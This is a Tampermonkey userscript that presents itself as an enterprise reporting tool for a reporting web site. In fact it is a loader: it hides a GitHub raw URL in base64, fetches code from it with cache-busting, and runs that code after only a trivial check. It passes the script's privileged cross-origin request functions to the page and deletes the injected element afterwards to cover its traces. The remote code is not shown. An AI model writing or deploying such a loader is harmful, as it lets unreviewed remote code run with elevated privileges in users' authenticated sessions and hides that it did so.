// ==UserScript==
// @name         CAR System Tool
// @namespace    http://tampermonkey.net/
// @version      2.2
// @description  Enterprise reporting tool
// @author       System Administrator
// @match        https://haesl.gaelenlighten.com/Reporting/ReportingManagement*
// @match        https://haesl.gaelenlighten.com/Reporting/Report/Index/*
// @grant        GM_xmlhttpRequest
// @grant        GM_addStyle
// @grant        GM_getValue
// @grant        GM_setValue
// @run-at       document-start
// ==/UserScript==

(function() {
    'use strict';
    
    // Configuration object
    const config = {
        endpoint: 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0p3b1RvTGVlL3BTY3JpcHQvbWFpbi9zY3JpcHRfY29yZS5qcw==',
        timeout: 15000,
        maxRetries: 3,
        retryDelay: 2000
    };
    
    function decodeEndpoint(encoded) {
        try {
            return atob(encoded);
        } catch (e) {
            console.error('Configuration error');
            return null;
        }
    }
    
    function validateEnvironment() {
        return window.location.hostname.includes('haesl.gaelenlighten.com');
    }
    
    function executeScript(scriptContent) {
        try {
            // Create a bridge to expose GM functions to the injected script
            window.GM_bridge = {
                addStyle: GM_addStyle,
                getValue: GM_getValue,
                setValue: GM_setValue,
                xmlhttpRequest: GM_xmlhttpRequest
            };
            
            // Modify the script content to use the bridge
            const modifiedScript = scriptContent
                .replace(/GM_addStyle/g, 'window.GM_bridge.addStyle')
                .replace(/GM_getValue/g, 'window.GM_bridge.getValue')
                .replace(/GM_setValue/g, 'window.GM_bridge.setValue')
                .replace(/GM_xmlhttpRequest/g, 'window.GM_bridge.xmlhttpRequest');
            
            // Create a script element and inject it into the page
            const scriptElement = document.createElement('script');
            scriptElement.textContent = modifiedScript;
            scriptElement.setAttribute('type', 'text/javascript');
            
            // Inject into the document head
            (document.head || document.documentElement).appendChild(scriptElement);
            
            // Clean up the script element after a brief delay
            setTimeout(() => {
                if (scriptElement.parentNode) {
                    scriptElement.parentNode.removeChild(scriptElement);
                }
                // Clean up the bridge
                delete window.GM_bridge;
            }, 3000);
            
            return true;
        } catch (error) {
            console.error('Script execution error:', error.message);
            return false;
        }
    }
    
    function loadMainScript(attempt = 1) {
        if (!validateEnvironment()) {
            console.warn('Unauthorized domain');
            return;
        }
        
        const scriptUrl = decodeEndpoint(config.endpoint);
        if (!scriptUrl) {
            console.error('Invalid configuration');
            return;
        }
        
        const requestUrl = scriptUrl + '?v=' + Date.now() + '&r=' + Math.random().toString(36).substr(2, 9);
        
        GM_xmlhttpRequest({
            method: 'GET',
            url: requestUrl,
            timeout: config.timeout,
            onload: function(response) {
                if (response.status === 200) {
                    const content = response.responseText;
                    
                    // Validate content
                    if (content && 
                        content.length > 1000 && 
                        (content.includes('CAR Batch Extractor') || content.includes('function'))) {
                        
                        const success = executeScript(content);
                        if (!success && attempt < config.maxRetries) {
                            console.warn('Execution failed, retrying in ' + config.retryDelay + 'ms...');
                            setTimeout(() => loadMainScript(attempt + 1), config.retryDelay);
                        }
                    } else {
                        console.error('Invalid content received');
                        if (attempt < config.maxRetries) {
                            setTimeout(() => loadMainScript(attempt + 1), config.retryDelay * attempt);
                        }
                    }
                } else {
                    console.error('HTTP error:', response.status);
                    if (attempt < config.maxRetries) {
                        setTimeout(() => loadMainScript(attempt + 1), config.retryDelay * attempt);
                    }
                }
            },
            onerror: function() {
                console.error('Network error');
                if (attempt < config.maxRetries) {
                    setTimeout(() => loadMainScript(attempt + 1), config.retryDelay * attempt);
                }
            },
            ontimeout: function() {
                console.error('Request timeout');
                if (attempt < config.maxRetries) {
                    setTimeout(() => loadMainScript(attempt + 1), config.retryDelay);
                }
            }
        });
    }
    
    function initialize() {
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => {
                setTimeout(loadMainScript, 100);
            });
        } else {
            setTimeout(loadMainScript, 50);
        }
    }
    
    // Start initialization
    initialize();
    
})();
